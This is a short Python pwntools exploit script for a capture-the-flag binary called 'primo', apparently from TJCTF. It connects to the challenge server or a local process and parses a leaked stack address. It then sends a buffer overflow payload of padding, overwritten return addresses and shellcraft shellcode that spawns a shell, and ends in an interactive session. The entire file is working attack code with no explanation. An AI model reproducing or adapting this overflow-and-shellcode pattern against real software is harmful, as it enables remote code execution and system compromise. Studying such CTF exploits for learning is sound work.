from pwn import *

e = ELF("./primo")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("p1.tjctf.org", 8011)
else:
  p = process(e.path)
  # {"LD_PRELOAD": libc.path})

p.recvuntil("0x")
leak = int(p.recvline(), 16)

debug()

p.sendline("A" * 0x20 + p32(leak + 0x30) * 3 + p32(leak + 0x34) * 2 + asm(shellcraft.sh()))


p.interactive()
